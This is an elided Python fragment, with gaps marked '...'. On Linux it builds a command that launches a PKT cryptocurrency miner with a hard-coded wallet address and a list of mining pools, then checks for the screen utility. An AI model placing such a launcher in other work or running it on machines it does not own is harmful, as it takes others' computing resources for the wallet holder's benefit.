...
if operate_system == 'lin':
    ...
    try:
        ...
        pass
    if pkt_dachay == False:
        command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.k1m3r4.com/ http://p.master.pktdigger.com/ http://pool.pkteer.com http://pool.pkthash.com -t 1' % pkt_name
        print(command)
        if os.path.isfile('/usr/bin/screen'):
            print('Co chuong trinh screen')
